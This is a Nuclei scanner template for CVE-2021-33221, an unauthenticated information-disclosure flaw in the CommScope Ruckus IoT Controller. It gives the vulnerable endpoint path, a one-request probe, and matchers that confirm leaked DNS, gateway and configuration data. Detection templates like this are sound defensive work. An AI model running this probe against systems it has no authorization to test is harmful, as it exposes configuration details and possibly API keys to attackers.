id: CVE-2021-33221

info:
  name: CommScope Ruckus IoT Controller - Information Disclosure
  author: geeknik
  severity: critical
  description: CommScope Ruckus IoT Controller is susceptible to information disclosure vulnerabilities because a 'service details' API endpoint discloses system and configuration information to an attacker without requiring authentication. This information includes DNS and NTP servers that the devices use for time and host resolution. It also includes the internal hostname and IoT Controller version. A fully configured device in production may leak other, more sensitive information (API keys and tokens).
  impact: |
    Successful exploitation of this vulnerability could result in the exposure of sensitive data, potentially leading to further attacks or unauthorized access.
  remediation: |
    Apply the latest security patches or updates provided by CommScope to mitigate the information disclosure vulnerability (CVE-2021-33221).
  reference:
    - https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf
    - http://seclists.org/fulldisclosure/2021/May/72
    - https://korelogic.com/advisories.html
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33221
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-33221
    cwe-id: CWE-306
    epss-score: 0.90195
    epss-percentile: 0.99566
    cpe: cpe:2.3:a:commscope:ruckus_iot_controller:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: commscope
    product: ruckus_iot_controller
  tags: cve2021,cve,commscope,ruckus,debug,service,leak,seclists

http:
  - method: GET
    path:
      - "{{BaseURL}}/service/v1/service-details"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "application/json"

      - type: word
        words:
          - "message"
          - "ok"
          - "data"
          - "dns"
          - "gateway"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100a6ba6fe8606d9de1b05e40ce7cc7537e21a2168b0ee51e5e1a89777275a0c1dc02203b3d5fbc702117cdaa32d544f95bebb7c9875f35aa75a7b3dd801af6b6f81121:922c64590222798bb761d5b6d8e72950